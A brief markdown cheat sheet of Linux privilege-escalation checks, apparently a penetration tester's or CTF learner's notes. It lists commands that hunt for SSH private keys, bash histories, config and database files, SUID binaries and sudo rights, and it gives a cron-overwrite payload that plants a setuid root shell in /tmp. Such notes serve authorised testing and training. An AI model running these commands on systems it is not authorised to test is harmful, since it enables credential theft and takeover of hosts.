# 3 privEsc (linux)

## Manual scanning

- Check for sensitive files in home directories.

```
find /home/ -name .bash_history 2> /dev/null
```

```
find /home/ -name .ssh 2> /dev/null
```

- Check for sensitive files in web server directory.

```
find /var/www/ -name "*config*.*"
```

```
find /var/www/ -name "*.db"
```

- Check for sensitive files in other directories.

```
/home
~
/
```

```
find / -name id_rsa 2> /dev/null 
```

- Check for readable hashes

```shell
ls -l /etc/shadow
```

- Check sudo commands.
You don't always need the user creds to run this escalation!

```shell
sudo -l
```

- Check group memberships.

```shell
id
```

- Check for files owned by a specific user

```shell
find / -user username 2> /dev/null
```

- Check `/etc/crontab` for interesting cronjobs. See if we can do malicious overwrites such as
```
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

- Check files that have SUID bits set.

```shell
find / -perm -u=s -type f -ls 2>/dev/null
```

- Check for Linux capabilities

```shell
getcap -r / 2> /dev/null
```

- Check the environment variables of the shell. 
- Check if there are scripts or commands to are vulnerable to `PATH` manipulation.
- Check for kernel exploits.
  - Determine kernel version using `uname -a`.
  - Search exploit databases for match.
  - Run exploit.

## Automated scanning
- LinPeas [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng).
- LinEnum [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum).

